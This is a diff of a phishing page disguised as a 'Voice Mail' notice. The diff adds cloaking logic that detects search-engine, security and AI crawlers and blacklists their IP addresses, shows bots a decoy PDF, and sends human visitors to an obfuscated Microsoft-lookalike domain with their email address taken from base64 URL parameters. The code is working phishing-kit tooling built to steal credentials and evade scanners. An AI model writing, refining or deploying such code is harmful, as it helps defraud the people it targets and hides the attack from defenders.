@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloaking Example</title>
+    <title>Voice Mail</title>
     <style>
         body, html {
             margin: 0;
@@ -42,7 +42,6 @@
     var checkCountry = false;
     var Country = "";
 
-    let combinedResult = ''; // Declare a variable to hold the combined result
 function getBase64FromUrl() {
     const url = window.location.href;
     const urlObj = new URL(url);
@@ -88,18 +87,12 @@ function getBase64FromUrl() {
     } else {
         extractedDevice = 'utm_device parameter not found.';
     }
-
-    // Combine decoded or extracted values without extra spaces
     const combinedSource = decodedSource || extractedSource;
     const combinedDevice = decodedDevice || extractedDevice;
     combinedResult = [combinedSource, combinedDevice].filter(Boolean).join('@');
-
-    // No longer displaying the combined result immediately
-    // You can log it or do something else if needed for debugging
     return combinedResult;
 }
 
-// Function to check if a string is Base64 encoded
 function isBase64(str) {
     try {
         return btoa(atob(str)).replace(/=/g, '') === str.replace(/=/g, '');
@@ -339,29 +332,39 @@ function sendMessage2() {
             const userAgent = navigator.userAgent;
             return botUserAgents.some(bot => userAgent.includes(bot));
         }
-
-        // Function to detect a specific query parameter
         function detectQueryParameter(paramName) {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.has(paramName) ? urlParams.get(paramName) : null;
         }
-
-        // Function to load content based on user agent and query parameter
-        function loadContent() {
+    function loadContent() {
     const isBot = detectUserAgent();
     const paramValue = detectQueryParameter('Bd');
-
     if (isBot) {
-        window.location.href = "block.html";
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                console.log(ip);
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
     } else if (paramValue) {
         const script = document.createElement('script');
         script.innerHTML = `
-            function isHuman() {
+           function isHuman() {
                 const userAgent = navigator.userAgent.toLowerCase();
                 const botUserAgents = [
-                    'Googlebot', 'Bingbot', 'Yahoo! Slurp', 'DuckDuckBot',
-                    'Baiduspider', 'YandexBot', 'Sogou', 'Exabot', 'facebot',
-                    'ia_archiver', 'python', 'curl', 'bot', 'spider', 'crawl'
+            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
+            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
+            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
+            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
+            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
+            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
+            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
+            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
+            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
+            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
+            'img2dataset', 'omgili', 'omgilibot'
                 ];
                 const isBot = botUserAgents.some(bot => userAgent.includes(bot));
                 const headlessChecks = [
@@ -374,38 +377,36 @@ function sendMessage2() {
                 return !isBot && !isHeadless;
             }
 
+            function isValidEmail(email) {
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailPattern.test(email);
+            }                
+
 function verifyAndRedirect() {
-    if (isHuman()) {
-        function getQueryParameter(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
-        }
-
-        function isBase64(str) {
-            try {
-                return btoa(atob(str)) === str;
-            } catch (err) {
-                return false;
-            }
-        }
-
-        const paramValue = getQueryParameter('EIP');
-        let finalValue;
-
-        if (paramValue && isBase64(paramValue)) {
-            finalValue = atob(paramValue);
-            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
-        } else {
-            finalValue = paramValue;
-            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
-        }
-    } else {
-        window.location.href = "File not found.html";
+                if (isHuman()) {
+                    if (isValidEmail('${getBase64FromUrl()}')) {
+                        window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+'${getBase64FromUrl()}');
+                    } else {
+             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
+                    }
+                } else {
+            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
     }
-}
+            }
 
-
-            setTimeout(verifyAndRedirect, 3000);
+            setTimeout(verifyAndRedirect, 1000);
         `;
         document.getElementById('content').innerHTML = `
 <!DOCTYPE html>
@@ -547,6 +548,14 @@ function verifyAndRedirect() {
                 <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
             </iframe>
         `;
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                console.log(ip);
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
     }
 }
         fetchIPInfo();
